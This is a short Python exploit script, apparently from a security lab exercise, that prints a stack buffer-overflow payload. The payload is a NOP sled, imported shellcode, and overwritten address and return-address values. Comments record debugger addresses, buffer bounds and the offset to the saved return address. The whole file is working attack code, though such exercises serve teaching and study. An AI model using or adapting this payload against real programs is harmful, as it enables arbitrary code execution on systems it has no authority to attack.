from shellcode import shellcode
from struct import pack 
import sys

def main():
    
    for i in range(2025):
        sys.stdout.buffer.write(b"\x90")
    sys.stdout.buffer.write(shellcode) #size 24bytes
    sys.stdout.buffer.write(pack("<I",0xfffe83d0)) #address of shell code
    sys.stdout.buffer.write(pack("<I",0xfffe8bcc)) #return address after function call

if __name__ == "__main__":
    main()

#return addr points to 
    #eip 0xfffef9ac

#buffer starts @
    #0xfffef198
#buffer ends @
    #0xfffef998


#difference in offset 2068

#  x/32wx 0xfffef990
#break *0x08049d3f

#first val overwrites a
#second overwrites p